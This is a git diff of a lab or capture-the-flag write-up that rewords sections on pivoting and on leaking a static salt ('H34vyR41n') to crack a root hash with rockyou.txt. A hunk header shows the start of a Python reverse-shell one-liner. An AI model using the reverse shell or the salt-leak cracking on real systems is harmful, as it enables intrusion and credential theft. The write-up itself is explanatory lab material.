@@ -80,7 +80,7 @@ python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SO
 
 <figure><img src="../../../.gitbook/assets/image (110) (1).png" alt=""><figcaption></figcaption></figure>
 
-### Pivoting
+## Pivoting
 
 Now, we need to think about how to use this container to find out more about the machine. Firstly, I took a look around at the IP addresses and found out that I should be scanning the other containers present on this network using some tunneling. What gave it away for me was the IP address ending in 3, meaning there are probably other hosts on this.
 
@@ -331,21 +331,19 @@ This would output something like this:
 
 <figure><img src="../../../.gitbook/assets/image (24) (1) (2) (1).png" alt=""><figcaption></figcaption></figure>
 
-H is the first character of the salt. Repeated tests of this script shows that the first character of this hash does not change, indicating the salt is static and not randomly generated. This was really cool, and we are able to slowly pull out the rest of this hash.
-
-I didn't have the prowess (or patience) to automate the whole process, so I brute forced it myself using this script.
+H is the first character of the salt. Repeated tests of this script shows that the first character of this hash does not change, indicating the salt is static and not randomly generated. We can thus pull out the salt char by char.&#x20;
 
 We can keep dragging out the next few characters by changing the hashed password and the plaintext password, removing 1 byte at a time and adding one to our flag variable.&#x20;
 
 <figure><img src="../../../.gitbook/assets/image (8) (3).png" alt=""><figcaption></figcaption></figure>
 
-'H34vyR41n' is the salt, and now we can crack the original hash for root we found earlier.
+'H34vyR41n' is the final salt, and now we can crack the original hash for root we found earlier.
 
 We can generate a wordlist with rockyou.txt with the new salt at the back.
 
 <figure><img src="../../../.gitbook/assets/image (11) (2) (1).png" alt=""><figcaption></figcaption></figure>
 
-And we can crack this easily.
+And we can crack that hash easily to find the root password.
 
 <figure><img src="../../../.gitbook/assets/image (13) (2) (2) (1).png" alt=""><figcaption></figcaption></figure>
 
